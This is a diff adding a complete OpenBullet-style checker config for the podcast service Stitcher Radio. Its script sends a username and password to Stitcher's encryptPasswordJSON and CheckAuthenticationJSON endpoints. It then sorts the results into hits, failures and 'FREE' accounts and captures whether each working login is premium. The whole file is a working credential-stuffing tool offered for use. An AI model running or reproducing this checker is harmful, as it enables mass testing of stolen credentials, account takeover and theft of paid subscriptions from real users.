@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Stitcher Radio",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-17T09:07:57.4144363+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.stitcher.com/webservice/encryptPasswordJSON.php?mode=webApp&version=3.07&app_version=1.3" AutoRedirect=TRUE 
+  CONTENT "password=<PASS>&udid=aaaabbbbccccddddeeeeffffgggg" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.stitcher.com" 
+PARSE "<SOURCE>" LR "[\"" "\"]" Recursive=FALSE -> VAR "epx" "" "" 
+REQUEST GET "https://www.stitcher.com/webservice/CheckAuthenticationJSON.php?mode=website&sess=&guest=false&email=<USER>&udid=aaaabbbbccccddddeeeeffffgggg&epx=<epx>&fbid=null&facebookAccessToken=null&fbc=0&markStartup=1&timezone=7200" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" JSON "isPremium" Recursive=FALSE -> CAP "isPremium" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "isPremium\":true" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"user_not_found\"}" 
+    KEY "{\"status\":\"login_incorrect\"}" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "isPremium\":false" 
